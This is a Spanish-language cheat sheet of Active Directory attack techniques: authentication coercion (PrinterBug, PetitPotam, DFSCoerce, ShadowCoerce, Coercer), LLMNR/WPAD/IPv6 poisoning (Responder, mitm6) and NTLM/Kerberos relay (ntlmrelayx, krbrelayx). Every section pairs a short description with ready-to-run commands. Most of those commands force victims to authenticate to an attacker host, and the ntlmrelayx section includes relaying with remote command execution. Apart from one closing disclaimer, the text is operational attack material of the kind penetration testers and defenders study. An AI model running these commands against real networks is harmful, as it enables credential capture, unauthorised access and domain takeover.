# Técnicas y Herramientas para Forzar Autenticación NTLM y Kerberos en Active Directory

---

## Índice de Técnicas

1. [PrinterBug (MS-RPRN)](#1-printerbug-ms-rprn)
2. [PetitPotam (EFSRPC)](#2-petitpotam-efsrpc)
3. [Dementor (DRSUAPI)](#3-dementor-drsuapi)
4. [ShadowCoerce (VSS)](#4-shadowcoerce-vss)
5. [DFSCoerce (DFSNM)](#5-dfscoerce-dfsnm)
6. [Coercer (Multiprotocolo)](#6-coercer-multiprotocolo)
7. [ADIDNS/DNSadmin](#7-adidnsdnsadmin)
8. [Responder (LLMNR/NBT-NS/WPAD/mDNS)](#8-responder-llmnrnbt-nswpadmdns)
9. [WPAD/LLMNR/mDNS/MITM6](#9-wpadllmnrmdnsmitm6)
10. [Otros Coerciones (FSRVPCoerce, SchtasksCoerce, ICPRCoerce)](#10-otros-coerciones-fsrvpcoerce-schtaskscoerce-icprcoerce)
11. [NTLMRelayx (Relay de autenticación NTLM)](#11-ntlmrelayx-relay-de-autenticación-ntlm)
12. [Krbrelayx (Relay de autenticación Kerberos)](#12-krbrelayx-relay-de-autenticación-kerberos)

---

## 1. PrinterBug (MS-RPRN)
| Aspecto         | Detalle                                                                                      |
|-----------------|---------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del servicio de impresión para forzar autenticación NTLM de la víctima hacia el atacante. |
| **Condiciones** | Servicio de impresoras activo en la víctima (por defecto en DCs antiguos, puede estar deshabilitado). |

**Herramientas y comandos:**
- **Linux:**  
  - **Impacket/printerbug.py:**  
    ```bash
    python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<VICTIMA_DC> <attacker_host>
    ```
- **Windows:**  
  - **SpoolSample (C#):**  
    ```powershell
    SpoolSample.exe <victima> <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 2. PetitPotam (EFSRPC)
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del protocolo EFSRPC (MS-EFSR) para forzar autenticación NTLM de la víctima.              |
| **Condiciones** | Víctima debe tener el servicio EFSRPC habilitado (normal en DC/Windows reciente).                |

**Herramientas y comandos:**
- **Linux:**  
  - **PetitPotam:**  
    ```bash
    python3 PetitPotam.py <TARGET> <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 3. Dementor (DRSUAPI)
| Aspecto         | Detalle                                                                                                      |
|-----------------|-------------------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del protocolo de replicación DRSUAPI para forzar autenticación NTLM desde el DC hacia el atacante.     |
| **Condiciones** | Acceso a DRSUAPI (normal con usuario autenticado en el dominio, DC objetivo debe estar accesible).           |

**Herramientas y comandos:**
- **Windows:**  
  - **Dementor.exe:**  
    ```powershell
    Dementor.exe --target <DC> --listener <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 4. ShadowCoerce (VSS)
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del servicio de Shadow Copies (VSS) para forzar autenticación NTLM.                       |
| **Condiciones** | Máquina objetivo debe tener el servicio de shadow copies expuesto (normal en muchos Windows).    |

**Herramientas y comandos:**
- **Linux:**  
  - **ShadowCoerce:**  
    ```bash
    python3 shadowcoerce.py <TARGET> <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 5. DFSCoerce (DFSNM)
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del servicio Distributed File System Namespace (MS-DFSNM) para forzar autenticación.       |
| **Condiciones** | El servicio DFS debe estar activo en la máquina víctima.                                         |

**Herramientas y comandos:**
- **Linux:**  
  - **DFSCoerce:**  
    ```bash
    python3 dfscoerce.py <TARGET> <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 6. Coercer (Multiprotocolo)
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Herramienta multiprotocolo que automatiza la coerción usando varios protocolos y servicios.      |
| **Condiciones** | Dependen del protocolo elegido (EFSRPC, MS-RPRN, VSS, DFS, etc.).                               |

**Herramientas y comandos:**
- **Linux:**  
  - **Coercer:**  
    ```bash
    python3 coercer.py -t <TARGET> -l <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 7. ADIDNS/DNSadmin
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa de privilegios DNSadmin para crear registros maliciosos que fuerzan autenticaciones.       |
| **Condiciones** | Privilegios DNSadmin sobre el servidor DNS de AD.                                               |

**Herramientas y comandos:**
- **Windows:**  
  - **PowerShell / SharpDNS / scripts:**  
    ```powershell
    Add-DnsServerResourceRecordCName -Name <fake> -HostNameAlias <attacker_host> -ZoneName <zone>
    ```
- **Linux:**  
  - **SharpDNS / scripts personalizados**

[Volver al índice](#índice-de-técnicas)

---

## 8. Responder (LLMNR/NBT-NS/WPAD/mDNS)
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Herramienta que explota la falta de autenticación en protocolos de resolución de nombres (LLMNR, NBT-NS, WPAD, mDNS) para capturar o relayar hashes NTLM de usuarios que intentan acceder a recursos inexistentes. |
| **Condiciones** | Protocolos LLMNR/NBT-NS/WPAD/mDNS habilitados en la red y usuarios accediendo a recursos no existentes.  |

**Herramientas y comandos:**
- **Linux:**  
  - **Responder:**  
    ```bash
    sudo responder -I <interface>
    ```
- **Windows:**  
  - **Inveigh (PowerShell):**  
    ```powershell
    Invoke-Inveigh
    ```

[Volver al índice](#índice-de-técnicas)

---

## 9. WPAD/LLMNR/mDNS/MITM6
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Ataca la autoconfiguración de proxy (WPAD) y la resolución de nombres (LLMNR/mDNS), pudiendo capturar autenticaciones NTLM. MITM6 fuerza el uso de IPv6 para ataques similares. |
| **Condiciones** | Red interna sin segmentar, protocolos no filtrados y clientes con IPv6 habilitado (MITM6).       |

**Herramientas y comandos:**
- **Linux:**  
  - **MITM6:**  
    ```bash
    python3 mitm6.py -i <interface>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 10. Otros Coerciones (FSRVPCoerce, SchtasksCoerce, ICPRCoerce)
| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Herramientas para abusar de protocolos adicionales y forzar autenticación NTLM.                 |
| **Condiciones** | Dependen del protocolo: FSRVP (shadow copies), Task Scheduler, ICPR, etc.                        |

**Herramientas y comandos:**
- **Linux:**  
  - **FSRVPCoerce:**  
    ```bash
    python3 fsrvpcoerce.py <TARGET> <attacker_host>
    ```
  - **SchtasksCoerce:**  
    ```bash
    python3 schtaskscoerce.py <TARGET> <attacker_host>
    ```
  - **ICPRCoerce:**  
    ```bash
    python3 icprcoerce.py <TARGET> <attacker_host>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 11. NTLMRelayx (Relay de autenticación NTLM)
| Aspecto         | Detalle                                                                                      |
|-----------------|---------------------------------------------------------------------------------------------|
| **Descripción** | Herramienta para relayar autenticaciones NTLM capturadas (tras coerción o envenenamiento) hacia servicios como SMB, LDAP, HTTP, etc. Permite ejecución de comandos, creación de usuarios, extracción de secretos, etc. |
| **Condiciones** | El atacante debe recibir conexiones SMB/HTTP de la víctima y tener acceso al servicio destino. El relay depende de que SMB Signing (o LDAP signing) esté deshabilitado en el destino. |

**Herramientas y comandos:**
- **Linux:**  
  - **Impacket/ntlmrelayx.py:**  
    ```bash
    python3 ntlmrelayx.py -t smb://<target_smb> -smb2support
    ```
    - Relay a LDAP:
    ```bash
    python3 ntlmrelayx.py -t ldap://<target_ldap>
    ```
    - Relay múltiple:
    ```bash
    python3 ntlmrelayx.py -tf targets.txt
    ```
    - Ejecutar comandos:
    ```bash
    python3 ntlmrelayx.py -t smb://<target> -c <comando>
    ```

**Notas:**
- Suele usarse junto a técnicas de coerción o Responder.
- No conviene lanzar Responder y ntlmrelayx.py simultáneamente sobre SMB.

[Volver al índice](#índice-de-técnicas)

---

## 12. Krbrelayx (Relay de autenticación Kerberos)
| Aspecto         | Detalle                                                                                                           |
|-----------------|------------------------------------------------------------------------------------------------------------------|
| **Descripción** | Herramienta para relay de autenticaciones Kerberos (Kerberos relay), permitiendo el relay de tickets TGS a servicios como LDAP, HTTP, SMB, etc., incluso cuando NTLM no es una opción. |
| **Condiciones** | Requiere obtener un ticket de servicio (TGS) válido para el servicio objetivo y que los servicios destino no requieran protección adicional (S4U2Self/S4U2Proxy no mitigados, o configuración vulnerable). |

**Herramientas y comandos:**
- **Linux:**  
  - **krbrelayx (https://github.com/dirkjanm/krbrelayx):**  
    ```bash
    python3 krbrelayx.py -h
    # Ejemplo de uso típico:
    python3 krbrelayx.py --target ldap://<target_ldap> --ticket <ticket.kirbi>
    ```

**Notas:**
- Permite ataques relay y abuso de privilegios en entornos Kerberos.
- Es más avanzado que NTLM relay y depende de la arquitectura y configuración (típicamente más difícil de explotar, pero muy poderoso en entornos mal configurados).

[Volver al índice](#índice-de-técnicas)

---

**Notas generales:**
- Sustituye `<TARGET>`, `<attacker_host>`, `<USER>`, `<PASS>`, `<DOMAIN>`, `<DC>`, `<interface>`, etc. por los valores reales de tu entorno.
- Todas las técnicas requieren que el atacante pueda escuchar peticiones SMB/HTTP/LDAP en su host.
- Algunas requieren privilegios elevados.
- No ejecutes estas acciones fuera de un entorno controlado y autorizado.
